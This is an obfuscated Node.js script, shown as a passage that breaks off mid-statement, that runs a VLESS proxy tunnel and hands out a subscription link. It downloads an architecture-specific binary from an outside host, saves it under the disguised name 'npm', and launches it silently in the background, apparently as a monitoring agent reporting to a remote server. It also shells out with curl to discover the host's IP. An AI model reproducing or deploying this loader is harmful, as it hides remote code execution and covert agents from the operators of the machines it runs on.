const _0x15b22a=_0x513f;(function(_0x10d7ad,_0xacf02){const _0x58cbc9=_0x513f,_0x963b36=_0x10d7ad();while(!![]){try{const _0x33918f=-parseInt(_0x58cbc9(0x1c8))/0x1+parseInt(_0x58cbc9(0x1ce))/0x2+parseInt(_0x58cbc9(0x221))/0x3*(parseInt(_0x58cbc9(0x1eb))/0x4)+-parseInt(_0x58cbc9(0x1b4))/0x5+parseInt(_0x58cbc9(0x1f9))/0x6+-parseInt(_0x58cbc9(0x22c))/0x7+-parseInt(_0x58cbc9(0x1c5))/0x8*(-parseInt(_0x58cbc9(0x199))/0x9);if(_0x33918f===_0xacf02)break;else _0x963b36['push'](_0x963b36['shift']());}catch(_0x18388d){_0x963b36['push'](_0x963b36['shift']());}}}(_0x20a0,0x881be));const os=require('os'),fs=require('fs'),net=require(_0x15b22a(0x1ab)),http=require(_0x15b22a(0x20e)),axios=require(_0x15b22a(0x16a)),path=require('path'),{Buffer}=require('buffer'),{exec,execSync}=require('child_process'),UUID=process[_0x15b22a(0x1f6)][_0x15b22a(0x1e1)]||_0x15b22a(0x197),NEZHA_SERVER=process[_0x15b22a(0x1f6)][_0x15b22a(0x19c)]||_0x15b22a(0x1b5),NEZHA_PORT=process[_0x15b22a(0x1f6)][_0x15b22a(0x20b)]||'',NEZHA_KEY=process['env']['NEZHA_KEY']||_0x15b22a(0x1d3),AUTO_ACCESS=process['env'][_0x15b22a(0x19e)]||!![],XPATH=process[_0x15b22a(0x1f6)]['XPATH']||UUID[_0x15b22a(0x1ef)](0x0,0x8),SUB_PATH=process[_0x15b22a(0x1f6)][_0x15b22a(0x207)]||''+UUID,DOMAIN=process[_0x15b22a(0x1f6)][_0x15b22a(0x1a0)]||_0x15b22a(0x216),NAME=process[_0x15b22a(0x1f6)][_0x15b22a(0x20c)]||_0x15b22a(0x17a),PORT=process[_0x15b22a(0x1f6)][_0x15b22a(0x1a1)]||0x1eb4,SETTINGS={[_0x15b22a(0x1e1)]:UUID,[_0x15b22a(0x1c9)]:_0x15b22a(0x16b),['BUFFER_SIZE']:_0x15b22a(0x1f7),[_0x15b22a(0x18a)]:'%2F'+XPATH,[_0x15b22a(0x1fa)]:0x1e,['MAX_POST_SIZE']:0xf4240,[_0x15b22a(0x1be)]:0x7530,[_0x15b22a(0x1c7)]:0x400*0x400,[_0x15b22a(0x183)]:!![],[_0x15b22a(0x182)]:!![]};function validate_uuid(_0x5ad2c8,_0x8bf3cb){for(let _0x4a82b5=0x0;_0x4a82b5<0x10;_0x4a82b5++){if(_0x5ad2c8[_0x4a82b5]!==_0x8bf3cb[_0x4a82b5])return![];}return!![];}function concat_typed_arrays(_0x17c77a,..._0x244175){const _0x663ecc=_0x15b22a;if(!_0x244175||_0x244175[_0x663ecc(0x200)]<0x1)return _0x17c77a;let _0x541795=_0x17c77a['length'];for(let _0x5b710a of _0x244175)_0x541795+=_0x5b710a[_0x663ecc(0x200)];const _0x1b79a4=new _0x17c77a['constructor'](_0x541795);_0x1b79a4[_0x663ecc(0x191)](_0x17c77a,0x0),_0x541795=_0x17c77a[_0x663ecc(0x200)];for(let _0x1f6eaf of _0x244175){_0x1b79a4[_0x663ecc(0x191)](_0x1f6eaf,_0x541795),_0x541795+=_0x1f6eaf['length'];}return _0x1b79a4;}function log(_0x1494fa,..._0x296a51){const _0x1fae24=_0x15b22a;if(SETTINGS[_0x1fae24(0x1c9)]===_0x1fae24(0x16b))return;const _0x362a0c={'debug':0x0,'info':0x1,'warn':0x2,'error':0x3},_0x16b281={'debug':'\x1b[36m','info':_0x1fae24(0x1b3),'warn':_0x1fae24(0x1d4),'error':_0x1fae24(0x1e3),'reset':'\x1b[0m'},_0x315e87=_0x362a0c[SETTINGS[_0x1fae24(0x1c9)]]||0x1,_0x89d913=_0x362a0c[_0x1494fa]||0x0;if(_0x89d913>=_0x315e87){const _0x4eae5d=new Date()[_0x1fae24(0x1a7)](),_0x2bf99c=_0x16b281[_0x1494fa]||_0x16b281['reset'];console[_0x1fae24(0x192)](_0x2bf99c+'['+_0x4eae5d+_0x1fae24(0x23f)+_0x1494fa+']',..._0x296a51,_0x16b281[_0x1fae24(0x1e6)]);}}const getDownloadUrl=()=>{const _0x52676e=_0x15b22a,_0xae441=os['arch']();return _0xae441===_0x52676e(0x205)||_0xae441===_0x52676e(0x1d9)||_0xae441==='aarch64'?!NEZHA_PORT?'https://arm64.ssss.nyc.mn/v1':'https://arm64.ssss.nyc.mn/agent':!NEZHA_PORT?'https://amd64.ssss.nyc.mn/v1':_0x52676e(0x16c);},downloadFile=async()=>{const _0xf0c342=_0x15b22a;if(!NEZHA_KEY)return;try{const _0xc46546=getDownloadUrl(),_0x5ed400=await axios({'method':_0xf0c342(0x1e4),'url':_0xc46546,'responseType':_0xf0c342(0x1e2)}),_0x30c8cd=fs[_0xf0c342(0x19a)](_0xf0c342(0x204));return _0x5ed400[_0xf0c342(0x1ff)][_0xf0c342(0x180)](_0x30c8cd),new Promise((_0xba0176,_0x38b98e)=>{const _0x3ee69b=_0xf0c342;_0x30c8cd['on']('finish',()=>{const _0x41cd10=_0x513f;console[_0x41cd10(0x192)](_0x41cd10(0x229)),exec(_0x41cd10(0x21e),_0x48f292=>{if(_0x48f292)_0x38b98e(_0x48f292);_0xba0176();});}),_0x30c8cd['on'](_0x3ee69b(0x173),_0x38b98e);});}catch(_0x46b2ea){throw _0x46b2ea;}},runnz=async()=>{const _0xcf72e1=_0x15b22a;await downloadFile();let _0x84035c='',_0x2e2314='';if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x4dd99e=[_0xcf72e1(0x17e),_0xcf72e1(0x23c),_0xcf72e1(0x1db),'2087',_0xcf72e1(0x1bb),_0xcf72e1(0x193)];_0x84035c=_0x4dd99e[_0xcf72e1(0x1f1)](NEZHA_PORT)?_0xcf72e1(0x1ea):'',_0x2e2314='nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0xcf72e1(0x175)+NEZHA_KEY+'\x20'+_0x84035c+'\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x37977a=NEZHA_SERVER[_0xcf72e1(0x1f1)](':')?NEZHA_SERVER['split'](':')[_0xcf72e1(0x1bf)]():'',_0xb56c28=new Set([_0xcf72e1(0x17e),_0xcf72e1(0x23c),_0xcf72e1(0x1db),'2087',_0xcf72e1(0x1bb),'2053']),_0x315f8a=_0xb56c28[_0xcf72e1(0x1a9)](_0x37977a)?_0xcf72e1(0x22d):'false',_0x2f0476=_0xcf72e1(0x211)+NEZHA_KEY+_0xcf72e1(0x171)+NEZHA_SERVER+'\x0askip_connection_count:\x20false\x0askip_procs_count:\x20false\x0atemperature:\x20false\x0atls:\x20'+_0x315f8a+_0xcf72e1(0x212)+UUID;fs['writeFileSync'](_0xcf72e1(0x1a6),_0x2f0476);}_0x2e2314='nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&';}else return;}try{exec(_0x2e2314,{'shell':'/bin/bash'}),console[_0xcf72e1(0x192)](_0xcf72e1(0x1e7));}catch(_0x28b301){console[_0xcf72e1(0x173)](_0xcf72e1(0x1d7)+_0x28b301);}};async function addAccessTask(){const _0x1c71fc=_0x15b22a;if(AUTO_ACCESS!==!![])return;try{if(!DOMAIN)return;const _0x5b38b9=_0x1c71fc(0x1ee)+DOMAIN,_0x3b605e=_0x1c71fc(0x1ad)+_0x5b38b9+'\x22}\x27';exec(_0x3b605e,(_0x57a885,_0x1d1bc1,_0x2d02c9)=>{const _0x26d6ca=_0x1c71fc;if(_0x57a885){console[_0x26d6ca(0x173)](_0x26d6ca(0x1a3),_0x57a885[_0x26d6ca(0x23a)]);return;}console[_0x26d6ca(0x192)](_0x26d6ca(0x230),_0x1d1bc1);});}catch(_0x48174d){console[_0x1c71fc(0x173)](_0x1c71fc(0x188),_0x48174d[_0x1c71fc(0x23a)]);}}function parse_uuid(_0x47e9a6){const _0x4cbefa=_0x15b22a;_0x47e9a6=_0x47e9a6[_0x4cbefa(0x22b)]('-','');const _0x4bcab7=[];for(let _0x83ccb9=0x0;_0x83ccb9<0x10;_0x83ccb9++){_0x4bcab7['push'](parseInt(_0x47e9a6[_0x4cbefa(0x1f4)](_0x83ccb9*0x2,0x2),0x10));}return _0x4bcab7;}async function read_vless_header(_0x2f495f,_0x1e548c){const _0x54bac=_0x15b22a;let _0x52a904=0x0,_0x34bd4d=new Uint8Array(),_0x3bf9f9={'value':_0x34bd4d,'done':![]};async function _0x28bfda(_0x4677cc){const _0x48f829=_0x513f;if(_0x3bf9f9[_0x48f829(0x1fc)])throw new Error('header\x20length\x20too\x20short');const _0x344345=_0x4677cc-_0x52a904;if(_0x344345<0x1)return;_0x3bf9f9=await read_atleast(_0x2f495f,_0x344345),_0x52a904+=_0x3bf9f9[_0x48f829(0x232)][_0x48f829(0x200)],_0x34bd4d=concat_typed_arrays(_0x34bd4d,_0x3bf9f9[_0x48f829(0x232)]);}await _0x28bfda(0x1+0x10+0x1);const _0x49e8c9=_0x34bd4d[0x0],_0x277f85=_0x34bd4d[_0x54bac(0x1ef)](0x1,0x1+0x10),_0x31a995=parse_uuid(_0x1e548c);if(!validate_uuid(_0x277f85,_0x31a995))throw new Error(_0x54bac(0x23b));const _0x35f9fc=_0x34bd4d[0x1+0x10],_0x101168=0x1+0x10+0x1+_0x35f9fc+0x1+0x2+0x1;await _0x28bfda(_0x101168+0x1);const _0x10a507=_0x34bd4d[0x1+0x10+0x1+_0x35f9fc],_0xf7656d=0x1;if(_0x10a507!==_0xf7656d)throw new Error(_0x54bac(0x18d)+_0x10a507);const _0x36aa99=(_0x34bd4d[_0x101168-0x1-0x2]<<0x8)+_0x34bd4d[_0x101168-0x1-0x1],_0x455748=_0x34bd4d[_0x101168-0x1],_0x27b9ef=0x1,_0x3dedc1=0x2,_0x182b01=0x3;let _0x281199=-0x1;if(_0x455748===_0x27b9ef)_0x281199=_0x101168+0x4;else{if(_0x455748===_0x182b01)_0x281199=_0x101168+0x10;else _0x455748===_0x3dedc1&&(_0x281199=_0x101168+0x1+_0x34bd4d[_0x101168]);}if(_0x281199<0x0)throw new Error(_0x54bac(0x16e));await _0x28bfda(_0x281199);const _0x1c3e91=_0x101168;let _0xdb3961='';if(_0x455748===_0x27b9ef)_0xdb3961=_0x34bd4d[_0x54bac(0x1ef)](_0x1c3e91,_0x1c3e91+0x4)[_0x54bac(0x1df)]('.');else{if(_0x455748===_0x3dedc1)_0xdb3961=new TextDecoder()[_0x54bac(0x1cf)](_0x34bd4d[_0x54bac(0x1ef)](_0x1c3e91+0x1,_0x1c3e91+0x1+_0x34bd4d[_0x1c3e91]));else _0x455748===_0x182b01&&(_0xdb3961=_0x34bd4d['slice'](_0x1c3e91,_0x1c3e91+0x10)[_0x54bac(0x17c)]((_0x4c9b05,_0x92836b,_0x901e2b,_0x161514)=>_0x901e2b%0x2?_0x4c9b05[_0x54bac(0x246)](((_0x161514[_0x901e2b-0x1]<<0x8)+_0x92836b)[_0x54bac(0x172)](0x10)):_0x4c9b05,[])[_0x54bac(0x1df)](':'));}if(!_0xdb3961){log(_0x54bac(0x173),_0x54bac(0x1a5));throw new Error(_0x54bac(0x202));}return log(_0x54bac(0x17d),_0x54bac(0x21b)+_0xdb3961+':'+_0x36aa99),{'hostname':_0xdb3961,'port':_0x36aa99,'data':_0x34bd4d[_0x54bac(0x1ef)](_0x281199),'resp':new Uint8Array([_0x49e8c9,0x0])};}async function read_atleast(_0x369669,_0x2ffb4c){const _0x443d0f=_0x15b22a,_0x1cd7cf=[];let _0x55d1b6=![];while(_0x2ffb4c>0x0&&!_0x55d1b6){const _0x14938f=await _0x369669[_0x443d0f(0x196)]();if(_0x14938f['value']){const _0x165ad0=new Uint8Array(_0x14938f[_0x443d0f(0x232)]);_0x1cd7cf[_0x443d0f(0x1dd)](_0x165ad0),_0x2ffb4c-=_0x165ad0[_0x443d0f(0x200)];}_0x55d1b6=_0x14938f[_0x443d0f(0x1fc)];}if(_0x2ffb4c>0x0)throw new Error('not\x20enough\x20data\x20to\x20read');return{'value':concat_typed_arrays(..._0x1cd7cf),'done':_0x55d1b6};}async function parse_header(_0x498790,_0xd45942){const _0x3f0176=_0x15b22a;log('debug',_0x3f0176(0x248));const _0x2272e1=_0xd45942[_0x3f0176(0x1ec)][_0x3f0176(0x23e)]();try{const _0x5f3012=await read_vless_header(_0x2272e1,_0x498790);return log(_0x3f0176(0x1b8),_0x3f0176(0x16f)),_0x5f3012;}catch(_0x1b705c){log(_0x3f0176(0x173),_0x3f0176(0x1c0)+_0x1b705c['message']);throw new Error('read\x20vless\x20header\x20error:\x20'+_0x1b705c[_0x3f0176(0x23a)]);}finally{_0x2272e1[_0x3f0176(0x1c4)]();}}async function connect_remote(_0x2ab9be,_0x531b55){const _0x2baf9c=_0x15b22a,_0x417444=0x1f40;try{const _0x2e1b74=await timed_connect(_0x2ab9be,_0x531b55,_0x417444);return _0x2e1b74[_0x2baf9c(0x187)](!![]),_0x2e1b74[_0x2baf9c(0x20d)](!![],0x3e8),_0x2e1b74[_0x2baf9c(0x1f5)]=parseInt(SETTINGS[_0x2baf9c(0x194)])*0x400,log('info','Connected\x20to\x20'+_0x2ab9be+':'+_0x531b55),_0x2e1b74;}catch(_0x3794e2){log(_0x2baf9c(0x173),_0x2baf9c(0x18e)+_0x3794e2[_0x2baf9c(0x23a)]);throw _0x3794e2;}}function timed_connect(_0x366b23,_0x23e3d6,_0xbd2a56){return new Promise((_0x1e14a1,_0x52917b)=>{const _0x2448b3=_0x513f,_0x34f2b7=net[_0x2448b3(0x219)]({'host':_0x366b23,'port':_0x23e3d6}),_0x4765a4=setTimeout(()=>{const _0x505017=_0x2448b3;_0x52917b(new Error(_0x505017(0x235)));},_0xbd2a56);_0x34f2b7['on'](_0x2448b3(0x237),()=>{clearTimeout(_0x4765a4),_0x1e14a1(_0x34f2b7);}),_0x34f2b7['on'](_0x2448b3(0x173),_0x379dfb=>{clearTimeout(_0x4765a4),_0x52917b(_0x379dfb);});});}function _0x513f(_0x4dbbcd,_0x534e9c){const _0x20a021=_0x20a0();return _0x513f=function(_0x513f2d,_0x548c7a){_0x513f2d=_0x513f2d-0x168;let _0x5b40f7=_0x20a021[_0x513f2d];return _0x5b40f7;},_0x513f(_0x4dbbcd,_0x534e9c);}function pipe_relay(){async function _0x1f18a7(_0x5a628c,_0x517ad2,_0x5e61c9){const _0x4648e9=_0x513f,_0x1af141=parseInt(SETTINGS[_0x4648e9(0x1c7)]);if(_0x5e61c9[_0x4648e9(0x200)]>0x0){if(_0x517ad2[_0x4648e9(0x214)])_0x517ad2['cork'](),_0x517ad2[_0x4648e9(0x214)](_0x5e61c9),process['nextTick'](()=>_0x517ad2[_0x4648e9(0x220)]());else{const _0x109e7a=_0x517ad2[_0x4648e9(0x22f)][_0x4648e9(0x178)]();try{await _0x109e7a['write'](_0x5e61c9);}finally{_0x109e7a[_0x4648e9(0x1c4)]();}}}try{_0x5a628c[_0x4648e9(0x180)]?(_0x5a628c[_0x4648e9(0x241)](),_0x5a628c[_0x4648e9(0x180)](_0x517ad2,{'end':!![],'highWaterMark':_0x1af141}),_0x5a628c[_0x4648e9(0x1d0)]()):await _0x5a628c[_0x4648e9(0x1ec)][_0x4648e9(0x1d2)](_0x517ad2['writable'],{'preventClose':![],'preventAbort':![],'preventCancel':![],'signal':AbortSignal['timeout'](SETTINGS['SESSION_TIMEOUT'])});}catch(_0x22067e){!_0x22067e[_0x4648e9(0x23a)]['includes'](_0x4648e9(0x210))&&log(_0x4648e9(0x173),'Relay\x20error:',_0x22067e[_0x4648e9(0x23a)]);throw _0x22067e;}}return _0x1f18a7;}function socketToWebStream(_0x39dc6c){const _0x5b8789=_0x15b22a;let _0x5098ab,_0xff8a5a;return _0x39dc6c['on'](_0x5b8789(0x173),_0x3ea2c4=>{const _0x489015=_0x5b8789;log(_0x489015(0x173),_0x489015(0x1ed),_0x3ea2c4[_0x489015(0x23a)]),_0x5098ab?.['error'](_0x3ea2c4),_0xff8a5a?.[_0x489015(0x173)](_0x3ea2c4);}),{'readable':new ReadableStream({'start'(_0x393ee8){const _0x2cb3ec=_0x5b8789;_0x5098ab=_0x393ee8,_0x39dc6c['on']('data',_0x22be93=>{const _0x5a286a=_0x513f;try{_0x393ee8[_0x5a286a(0x1cb)](_0x22be93);}catch(_0x5d40aa){log(_0x5a286a(0x173),_0x5a286a(0x1d5),_0x5d40aa[_0x5a286a(0x23a)]);}}),_0x39dc6c['on'](_0x2cb3ec(0x184),()=>{const _0x341d93=_0x2cb3ec;try{_0x393ee8[_0x341d93(0x17b)]();}catch(_0x6627bd){log(_0x341d93(0x173),_0x341d93(0x222),_0x6627bd[_0x341d93(0x23a)]);}});},'cancel'(){const _0x5d338d=_0x5b8789;_0x39dc6c[_0x5d338d(0x1ae)]();}}),'writable':new WritableStream({'start'(_0x3ff623){_0xff8a5a=_0x3ff623;},'write'(_0x2535cf){return new Promise((_0x5350e0,_0x1c4fba)=>{const _0x16e37c=_0x513f;if(_0x39dc6c[_0x16e37c(0x1cc)]){_0x1c4fba(new Error(_0x16e37c(0x1b2)));return;}_0x39dc6c[_0x16e37c(0x214)](_0x2535cf,_0x118e52=>{if(_0x118e52)_0x1c4fba(_0x118e52);else _0x5350e0();});});},'close'(){const _0x2e4fce=_0x5b8789;!_0x39dc6c[_0x2e4fce(0x1cc)]&&_0x39dc6c[_0x2e4fce(0x184)]();},'abort'(_0x1e9d62){const _0x32774a=_0x5b8789;_0x39dc6c[_0x32774a(0x1ae)](_0x1e9d62);}})};}function relay(_0x476abf,_0x5a4f67,_0x1e236e,_0x5c807c){const _0x3998ca=_0x15b22a,_0x17d130=pipe_relay();let _0x2f8634=![];const _0x23a2fd=socketToWebStream(_0x1e236e);function _0x54ba4a(){const _0x3c28b4=_0x513f;if(!_0x2f8634){_0x2f8634=!![];try{_0x1e236e[_0x3c28b4(0x1ae)]();}catch(_0x3c9bee){!_0x3c9bee[_0x3c28b4(0x23a)][_0x3c28b4(0x1f1)](_0x3c28b4(0x210))&&!_0x3c9bee[_0x3c28b4(0x23a)][_0x3c28b4(0x1f1)](_0x3c28b4(0x185))&&log('error',_0x3c28b4(0x1bd)+_0x3c9bee[_0x3c28b4(0x23a)]);}}}const _0x48480a=_0x17d130(_0x5a4f67,_0x23a2fd,_0x5c807c[_0x3998ca(0x1ff)])[_0x3998ca(0x1c6)](_0x3c63e2=>{const _0x4c78d7=_0x3998ca;!_0x3c63e2['message'][_0x4c78d7(0x1f1)]('aborted')&&!_0x3c63e2[_0x4c78d7(0x23a)][_0x4c78d7(0x1f1)](_0x4c78d7(0x185))&&log(_0x4c78d7(0x173),_0x4c78d7(0x176)+_0x3c63e2[_0x4c78d7(0x23a)]);})['finally'](()=>{_0x5a4f67['reading_done']&&_0x5a4f67['reading_done']();}),_0x4cb3b4=_0x17d130(_0x23a2fd,_0x5a4f67,_0x5c807c[_0x3998ca(0x249)])[_0x3998ca(0x1c6)](_0x363e10=>{const _0x3299e2=_0x3998ca;!_0x363e10['message'][_0x3299e2(0x1f1)](_0x3299e2(0x210))&&!_0x363e10[_0x3299e2(0x23a)]['includes'](_0x3299e2(0x185))&&log('error',_0x3299e2(0x208)+_0x363e10[_0x3299e2(0x23a)]);});_0x4cb3b4[_0x3998ca(0x177)](()=>_0x48480a)[_0x3998ca(0x177)](_0x54ba4a);}const sessions=new Map();class Session{constructor(_0x4fa33d){const _0x41bee3=_0x15b22a;this[_0x41bee3(0x1af)]=_0x4fa33d,this['nextSeq']=0x0,this['downstreamStarted']=![],this[_0x41bee3(0x21f)]=Date[_0x41bee3(0x19f)](),this[_0x41bee3(0x181)]=null,this[_0x41bee3(0x213)]=null,this[_0x41bee3(0x1fd)]=![],this[_0x41bee3(0x179)]=null,this[_0x41bee3(0x1fe)]=![],this[_0x41bee3(0x240)]=new Map(),this[_0x41bee3(0x16d)]=![],this[_0x41bee3(0x1cd)]=[],this[_0x41bee3(0x18f)]=null,this[_0x41bee3(0x1fb)]=new Map(),log(_0x41bee3(0x1b8),_0x41bee3(0x1bc)+_0x4fa33d);}async[_0x15b22a(0x206)](_0x1bde87){const _0xe3da14=_0x15b22a;if(this[_0xe3da14(0x1fd)])return!![];try{log(_0xe3da14(0x1b8),_0xe3da14(0x217));const _0x5837e3=new ReadableStream({'start'(_0x488043){const _0x37339a=_0xe3da14;_0x488043[_0x37339a(0x1cb)](_0x1bde87),_0x488043['close']();}}),_0x57b5c7={'readable':_0x5837e3,'writable':new WritableStream()};return this[_0xe3da14(0x181)]=await parse_header(SETTINGS[_0xe3da14(0x1e1)],_0x57b5c7),log('info',_0xe3da14(0x22e)+this['vlessHeader'][_0xe3da14(0x1c1)]+':'+this[_0xe3da14(0x181)][_0xe3da14(0x236)]),this['remote']=await connect_remote(this['vlessHeader']['hostname'],this[_0xe3da14(0x181)][_0xe3da14(0x236)]),log(_0xe3da14(0x17d),_0xe3da14(0x243)),this[_0xe3da14(0x1fd)]=!![],!![];}catch(_0x401445){return log(_0xe3da14(0x173),'Failed\x20to\x20initialize\x20VLESS:\x20'+_0x401445[_0xe3da14(0x23a)]),![];}}async[_0x15b22a(0x215)](_0x25a0db,_0x52583b){const _0x19c575=_0x15b22a;try{this[_0x19c575(0x1fb)]['set'](_0x25a0db,_0x52583b),log(_0x19c575(0x1b8),'Buffered\x20packet\x20seq='+_0x25a0db+',\x20size='+_0x52583b['length']);while(this[_0x19c575(0x1fb)][_0x19c575(0x1a9)](this[_0x19c575(0x1b7)])){const _0x54fd12=this['pendingBuffers'][_0x19c575(0x1e4)](this['nextSeq']);this['pendingBuffers'][_0x19c575(0x1c3)](this[_0x19c575(0x1b7)]);if(!this[_0x19c575(0x1fd)]&&this[_0x19c575(0x1b7)]===0x0){if(!await this[_0x19c575(0x206)](_0x54fd12))throw new Error(_0x19c575(0x201));this[_0x19c575(0x179)]=Buffer[_0x19c575(0x186)](this[_0x19c575(0x181)][_0x19c575(0x249)]),await this[_0x19c575(0x198)](this[_0x19c575(0x181)]['data']),this[_0x19c575(0x18f)]&&this['_startDownstreamResponse']();}else{if(!this['initialized']){log(_0x19c575(0x1a2),_0x19c575(0x1d1)+_0x25a0db+'\x20before\x20initialization');continue;}await this[_0x19c575(0x198)](_0x54fd12);}this['nextSeq']++,log(_0x19c575(0x1b8),_0x19c575(0x238)+(this[_0x19c575(0x1b7)]-0x1));}if(this[_0x19c575(0x1fb)][_0x19c575(0x1ba)]>SETTINGS[_0x19c575(0x1fa)])throw new Error(_0x19c575(0x244));return!![];}catch(_0x261652){log('error',_0x19c575(0x226)+_0x261652['message']);throw _0x261652;}}['_startDownstreamResponse'](){const _0x22a411=_0x15b22a;if(!this['currentStreamRes']||!this['responseHeader'])return;try{const _0x29e414=this[_0x22a411(0x18f)]['socket']?.['alpnProtocol']||'http/1.1',_0x3da25e=_0x29e414==='h2';!this[_0x22a411(0x1fe)]&&(log('debug','Sending\x20VLESS\x20response\x20header\x20('+_0x29e414+_0x22a411(0x231)+this[_0x22a411(0x179)][_0x22a411(0x200)]+_0x22a411(0x1ac)),this[_0x22a411(0x18f)][_0x22a411(0x214)](this['responseHeader']),this[_0x22a411(0x1fe)]=!![]);if(_0x3da25e){this['currentStreamRes'][_0x22a411(0x223)]['setNoDelay'](!![]);const _0x500d49=new require(_0x22a411(0x1e2))['Transform']({'transform'(_0x41bbad,_0x3e8bd4,_0x20dc74){const _0x351eac=_0x22a411,_0x4b98e5=0x4000;for(let _0x4c317a=0x0;_0x4c317a<_0x41bbad[_0x351eac(0x200)];_0x4c317a+=_0x4b98e5){this[_0x351eac(0x1dd)](_0x41bbad[_0x351eac(0x1ef)](_0x4c317a,_0x4c317a+_0x4b98e5));}_0x20dc74();}});this[_0x22a411(0x213)]['pipe'](_0x500d49)[_0x22a411(0x180)](this[_0x22a411(0x18f)]);}else this['remote'][_0x22a411(0x180)](this[_0x22a411(0x18f)]);this[_0x22a411(0x213)]['on'](_0x22a411(0x184),()=>{const _0x4a5d33=_0x22a411;!this[_0x4a5d33(0x18f)][_0x4a5d33(0x224)]&&this['currentStreamRes'][_0x4a5d33(0x184)]();}),this[_0x22a411(0x213)]['on']('error',_0x42d969=>{const _0x3e39ff=_0x22a411;log('error',_0x3e39ff(0x1c2)+_0x42d969[_0x3e39ff(0x23a)]),!this['currentStreamRes'][_0x3e39ff(0x224)]&&this[_0x3e39ff(0x18f)][_0x3e39ff(0x184)]();});}catch(_0xc511db){log(_0x22a411(0x173),_0x22a411(0x1d8)+_0xc511db['message']),this['cleanup']();}}['startDownstream'](_0x1a26ef,_0x5b2ef4){const _0x5267ab=_0x15b22a;return!_0x1a26ef['headersSent']&&_0x1a26ef['writeHead'](0xc8,_0x5b2ef4),this[_0x5267ab(0x18f)]=_0x1a26ef,this[_0x5267ab(0x1fd)]&&this[_0x5267ab(0x179)]&&this[_0x5267ab(0x233)](),_0x1a26ef['on'](_0x5267ab(0x17b),()=>{const _0x1aebd6=_0x5267ab;log(_0x1aebd6(0x17d),_0x1aebd6(0x1b9)),this[_0x1aebd6(0x218)]();}),!![];}async[_0x15b22a(0x198)](_0x2cf000){const _0x81bb1f=_0x15b22a;if(!this[_0x81bb1f(0x213)]||this['remote'][_0x81bb1f(0x1cc)])throw new Error(_0x81bb1f(0x1e8));return new Promise((_0x487f68,_0x508480)=>{const _0x571cef=_0x81bb1f;this[_0x571cef(0x213)][_0x571cef(0x214)](_0x2cf000,_0x457c1b=>{const _0x8f6ca0=_0x571cef;_0x457c1b?(log(_0x8f6ca0(0x173),_0x8f6ca0(0x247)+_0x457c1b['message']),_0x508480(_0x457c1b)):_0x487f68();});});}['_startDownstreamResponse'](){const _0x32b49e=_0x15b22a;if(!this[_0x32b49e(0x18f)]||!this[_0x32b49e(0x179)])return;try{!this[_0x32b49e(0x1fe)]&&(this[_0x32b49e(0x18f)][_0x32b49e(0x214)](this['responseHeader']),this[_0x32b49e(0x1fe)]=!![]),this[_0x32b49e(0x213)][_0x32b49e(0x180)](this[_0x32b49e(0x18f)]),this['remote']['on'](_0x32b49e(0x184),()=>{const _0x4beb5f=_0x32b49e;!this['currentStreamRes'][_0x4beb5f(0x224)]&&this[_0x4beb5f(0x18f)][_0x4beb5f(0x184)]();}),this[_0x32b49e(0x213)]['on'](_0x32b49e(0x173),_0x51a37f=>{const _0x19035f=_0x32b49e;log(_0x19035f(0x173),_0x19035f(0x1c2)+_0x51a37f['message']),!this[_0x19035f(0x18f)][_0x19035f(0x224)]&&this[_0x19035f(0x18f)][_0x19035f(0x184)]();});}catch(_0x2b12b8){log(_0x32b49e(0x173),_0x32b49e(0x1d8)+_0x2b12b8[_0x32b49e(0x23a)]),this[_0x32b49e(0x218)]();}}[_0x15b22a(0x218)](){const _0x7f0da0=_0x15b22a;!this['cleaned']&&(this[_0x7f0da0(0x16d)]=!![],log(_0x7f0da0(0x1b8),_0x7f0da0(0x1f0)+this[_0x7f0da0(0x1af)]),this[_0x7f0da0(0x213)]&&(this[_0x7f0da0(0x213)][_0x7f0da0(0x1ae)](),this['remote']=null),this[_0x7f0da0(0x1fd)]=![],this[_0x7f0da0(0x1fe)]=![]);}}const metaInfo=execSync(_0x15b22a(0x20a),{'encoding':_0x15b22a(0x245)}),ISP=metaInfo['trim']();let IP=DOMAIN;if(!DOMAIN)try{IP=execSync('curl\x20-s\x20--max-time\x202\x20ipv4.ip.sb',{'encoding':_0x15b22a(0x245)})['trim']();}catch(_0x5b4079){try{IP='['+execSync(_0x15b22a(0x1b0),{'encoding':_0x15b22a(0x245)})[_0x15b22a(0x228)]()+']';}catch(_0x38e7c8){log('error',_0x15b22a(0x239),_0x38e7c8[_0x15b22a(0x23a)]),IP=_0x15b22a(0x168);}}const server=http[_0x15b22a(0x1a4)]((_0x404f8f,_0x495445)=>{const _0x4b0cc1=_0x15b22a,_0x1c6a80={'Access-Control-Allow-Origin':'*','Access-Control-Allow-Methods':_0x4b0cc1(0x242),'Cache-Control':_0x4b0cc1(0x1f8),'X-Accel-Buffering':'no','X-Padding':generatePadding(0x64,0x3e8)};if(_0x404f8f[_0x4b0cc1(0x1b6)]==='/'){const _0x1ca604=path[_0x4b0cc1(0x1df)](__dirname,_0x4b0cc1(0x234));fs[_0x4b0cc1(0x1da)](_0x1ca604,_0x4b0cc1(0x1e5),(_0x2eeaba,_0x498cec)=>{const _0xfc641f=_0x4b0cc1;if(_0x2eeaba){_0x495445[_0xfc641f(0x169)](0x1f4,{'Content-Type':_0xfc641f(0x19d)}),_0x495445[_0xfc641f(0x184)]('Internal\x20Server\x20Error');return;}_0x495445[_0xfc641f(0x169)](0xc8,{'Content-Type':_0xfc641f(0x1ca)}),_0x495445[_0xfc641f(0x184)](_0x498cec);});return;}if(_0x404f8f['url']==='/'+SUB_PATH){const _0x478751=_0x4b0cc1(0x190)+UUID+'@'+IP+_0x4b0cc1(0x18c)+IP+_0x4b0cc1(0x189)+IP+_0x4b0cc1(0x195)+SETTINGS[_0x4b0cc1(0x18a)]+_0x4b0cc1(0x227)+NAME+'-'+ISP,_0x431c3e=Buffer[_0x4b0cc1(0x186)](_0x478751)[_0x4b0cc1(0x172)](_0x4b0cc1(0x18b));_0x495445['writeHead'](0xc8,{'Content-Type':'text/plain'}),_0x495445[_0x4b0cc1(0x184)](_0x431c3e+'\x0a');return;}const _0x5afca4=_0x404f8f['url'][_0x4b0cc1(0x21d)](new RegExp(XPATH+_0x4b0cc1(0x17f)));if(!_0x5afca4){_0x495445[_0x4b0cc1(0x169)](0x194),_0x495445[_0x4b0cc1(0x184)]();return;}const 